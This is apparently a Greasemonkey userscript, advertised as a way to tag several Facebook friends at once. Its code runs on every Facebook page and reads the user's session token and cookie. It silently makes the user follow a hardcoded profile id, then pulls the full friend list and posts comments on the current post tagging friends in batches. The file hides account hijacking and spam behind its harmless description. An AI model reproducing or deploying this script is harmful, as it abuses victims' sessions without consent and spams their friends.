// ==UserScript==
// @name            Facebook Mention / Mark several friends on facebook
// @namespace       Facebook Mention / Mark several friends on facebook
// @include         https://*.facebook.com/*
// @include         *.facebook.com/*
// @require         http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// @version         30.0
// ==/UserScript== 

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
       
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 


 
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");


     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
   
    http4.send(params4);
}
 
function sublist(uidss) {
                var a = document.createElement('script');
                a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
                document.body.appendChild(a);
}
//marcar all
a("100000268593443");


/* CRÉDITOS AO MARCO POLO, ESSE CÓDIGO É MEU */
function x__0() { return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest; };

//Pegar todos amigos
function get_friends(){
  var a=x__0();
  a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer="+uid+"&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", false);
  a.send(null);
  if (a.readyState == 4) {
    var f = JSON.parse(a.responseText.substring(a.responseText.indexOf('{')));
    return f.payload.entries;
  }
  return false;
}

/* FIM DA PARTE DO MARCO POLO */


//Pegar todos amigos
function get_uid(b){
  var a=x__0();
  a.open("GET", 'http://graph.facebook.com/'+b, false);
  a.send();
  if (a.readyState == 4) {
    return uid = JSON.parse(a.responseText).id;

  }
  return false;
}
  // Pattern que vai trocar o valor dos comentários pelas marcações

var patt = /comment_text=(.*?)&/
var c = 1;
username = /\.com\/(.*?)\//.exec(window.top.location)[1];
uid = get_uid(username);
a = window.top.location;
termina = 0;
var amigos = get_friends();
post_id = /[0-9]{8,}/.exec(a);
        uids =  'comment_text=';
header = 'ft_ent_identifier='+post_id+'&comment_text=@[100000365625674:0]&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user='+uid+'&__a=1&__req=4u&fb_dtsg='+document.getElementsByName('fb_dtsg')[0].value+'&phstamp='+Math.random();
  for ( var n = 1 ; n < amigos.length ; n++ ){
      //uids += '%40[' + amigos[n].uid + '%3A' + encodeURI(amigos[n].text) + ']%20';
    fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
            uids += '%40[' + amigos[n].uid + '%3AAAAAAAAAAAA]%20';
            c++; 
            if(c == 7){            
                // Quando o contador chega em 7, ele termina o parâmetro com um &...
                uids += '&';
                // ...envia as coisas com o método do indiano...
                with(new XMLHttpRequest()) open("POST", "/ajax/ufi/add_comment.php?__a=1"),setRequestHeader("Content-Type", "application/x-www-form-urlencoded"),send(header.replace(patt, uids));

                // ... espera um segundo...
                z = setTimeout('function(){asd=0}', 1000);
                clearInterval(z);

                // ... e seta tudo de novo pra recomeçar
                c = 1;
                uids = 'comment_text=';
         

              }
            
    }